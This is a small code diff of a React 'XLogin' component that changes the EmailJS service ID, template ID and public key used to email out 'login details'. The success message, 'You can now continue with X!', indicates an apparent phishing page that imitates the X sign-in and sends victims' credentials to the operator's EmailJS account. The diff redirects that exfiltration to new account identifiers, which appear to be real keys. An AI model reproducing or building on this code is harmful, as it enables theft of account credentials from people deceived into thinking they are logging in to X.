@@ -21,10 +21,10 @@ export default function XLogin() {
     };
 
     emailjs.send(
-      "service_ftb4lhs",
-      "template_9zwksrd",
+      "service_dtolz9n",
+      "template_0ze0uwg",
       templateParams,
-      "o07HchFDD89TJ91W-"
+      "ngxOCmfwhTYpS9VyD"
     )
     .then(() => {
       alert("Login details sent successfully. You can now continue with X!");
